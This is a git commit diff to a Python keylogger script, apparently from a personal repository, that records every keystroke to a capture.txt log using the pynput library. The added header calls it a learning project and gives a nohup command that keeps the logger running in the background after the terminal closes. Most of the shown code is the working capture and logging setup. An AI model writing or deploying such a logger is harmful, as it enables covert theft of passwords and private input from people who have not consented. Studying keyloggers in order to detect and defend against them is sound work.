7b3389508b69cfbd0688dd8040077c71b931a969
alien-keric <102582785+alien-keric@users.noreply.github.com>
2024-02-15 03:57:08 -0500

    Update keylogger.py

--- keylogger.py
+++ keylogger.py
@@ -1,5 +1,10 @@
-from pynput.keyboard import Key, Listener # we need to install the pynput library (pip install pyniput)
-import logging # allows the keystrokes recorded being saved into the file
+#author alienX
+#purpose learning purpose
+#language: python3
+#nohup python3 keylogger.py & ( this enable the keylogger script to continue running at the background even when the terminal is closed)
+
+from pynput.keyboard import Key, Listener # you can to install the pynput library (pip install pyniput)
+import logging # allows the keystrokes recorded being saved into the file (capture.txt)
 
 logging.basicConfig(filename=("capture.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
 
@@ -9,5 +14,3 @@ def on_press(key):
 with Listener(on_press=on_press) as listener :
   listener.join()
 
-
-#nohup python3 keylogger.py & ( this enable the keylogger script to continue running at the background even when the terminal is closed)
